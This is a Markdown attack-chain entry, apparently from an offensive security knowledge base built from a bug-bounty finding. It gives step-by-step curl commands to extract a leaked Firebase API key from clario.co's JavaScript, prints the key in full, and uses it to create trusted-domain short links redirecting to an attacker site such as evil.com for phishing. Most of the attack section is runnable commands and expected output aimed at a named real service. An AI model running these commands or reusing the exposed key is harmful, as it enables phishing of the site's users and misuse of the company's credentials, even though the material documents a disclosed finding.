---
id: ac-1066410-001
tags:
  - api-key-leak
  - firebase
  - open-redirect
  - phishing
  - javascript-exposure
type: attack_chain
tools:
  - '[[tools/Postman]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-Leaked-Firebase-API-Key]]'
  - '[[procedures/Identify-URL-Shortening-Endpoint]]'
  - '[[procedures/Exploit-Firebase-API-for-Arbitrary-Redirects]]'
  - '[[procedures/Demonstrate-Open-Redirect-PoC]]'
step_count: 4
techniques:
  - '[[Credentials In Files]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:32:39.501Z'
description: >-
  Multi-stage attack exploiting a leaked Google API key for Firebase Dynamic
  Links and a regex misconfiguration to create arbitrary open redirect short
  links on the clario.co domain, facilitating phishing.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Credentials In Files]]'
  - '[[Drive-by Compromise]]'
---
# Leaked Firebase API Key Enabling Open Redirect via Misconfigured URL Shortening

Multi-stage attack chain demonstrating the discovery of a leaked API key and exploitation of a URL shortening misconfiguration to create phishing-friendly open redirects.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Leaked API Key] --> B[Identify Shortening Endpoint]
    B --> C[Exploit Misconfiguration]
    C --> D[Demonstrate PoC Redirect]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Postman]]

### Target Environment

- Web platform with client-side JavaScript files
- Access to Firebase Dynamic Links service
- No authentication required for public JS inspection

### Initial Access Requirements

- Public access to target website (e.g., account.clario.co)
- Browser for JS inspection or wget/curl for file download
- Network access to Firebase APIs

## Detailed Attack Procedures

### Step 1: Discover Leaked API Key
procedure: [[procedures/Discover-Leaked-Firebase-API-Key]]

**Objective**: Inspect client-side JavaScript to uncover exposed sensitive credentials like the Firebase API key.

**Instructions**: Load the target website and inspect the main JavaScript file using browser dev tools or download it directly. Search for strings like 'AIzaSy' which are common in Google API keys.

```bash
curl -o main.js https://account.clario.co/js/main.044af6485f6b0cd90809.js
grep -i 'AIzaSy' main.js
```

**Expected Output**: The leaked key AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ visible in the file.

**Success Indicators**:
- API key extracted from JS source
- Key format matches Google Firebase pattern

### Step 2: Identify URL Shortening Endpoint
procedure: [[procedures/Identify-URL-Shortening-Endpoint]]

**Objective**: Locate the endpoint used for URL shortening within the application code to understand the attack surface.

**Instructions**: In the same JavaScript file, search for URL patterns or API calls related to shortening, such as 'lnk.clario.co'.

```bash
grep -i 'lnk.clario.co' main.js
```

**Expected Output**: Endpoint https://lnk.clario.co/?link=[URLHERE] identified.

**Success Indicators**:
- Shortening service endpoint confirmed
- Regex or validation logic partially visible

### Step 3: Exploit Misconfiguration for Arbitrary Redirects
procedure: [[procedures/Exploit-Firebase-API-for-Arbitrary-Redirects]]

**Objective**: Use the leaked key to bypass regex restrictions and create short links redirecting to arbitrary malicious domains.

**Instructions**: Use the API key in requests to the Firebase Dynamic Links API, appending /clario.co/ to the target URL to evade domain validation regex.

Execute [[commands/create-firebase-short-link]] via curl or Postman:

```bash
curl -X POST 'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ' \
  -H 'Content-Type: application/json' \
  -d '{"longDynamicLink":"https://evil.com/clario.co/"}'
```

**Expected Output**: JSON response with a short link like https://lnk.clario.co/abc123 that redirects to evil.com.

**Success Indicators**:
- Short link generated successfully
- Redirect to arbitrary domain confirmed by following the link

### Step 4: Demonstrate Open Redirect PoC
procedure: [[procedures/Demonstrate-Open-Redirect-PoC]]

**Objective**: Validate the exploit by creating and testing a short link that leads to a malicious site, simulating phishing.

**Instructions**: Generate the short link as in Step 3, then test the redirect in a browser or with curl. Record the flow for proof.

```bash
curl -L 'https://lnk.clario.co/abc123'
```

**Expected Output**: HTTP 302 redirect to the malicious URL.

**Success Indicators**:
- Link appears legitimate (clario.co domain)
- Successful redirect to attacker-controlled site

## Attack Chain Summary

### Key Achievements

1. Exposed API key discovery enabling unauthorized API access
2. Bypassed URL validation for arbitrary redirects
3. Created phishing vectors using trusted domain short links

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Credentials In Files]] Credentials In Files
- [[Drive-by Compromise]] Drive-by Compromise

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
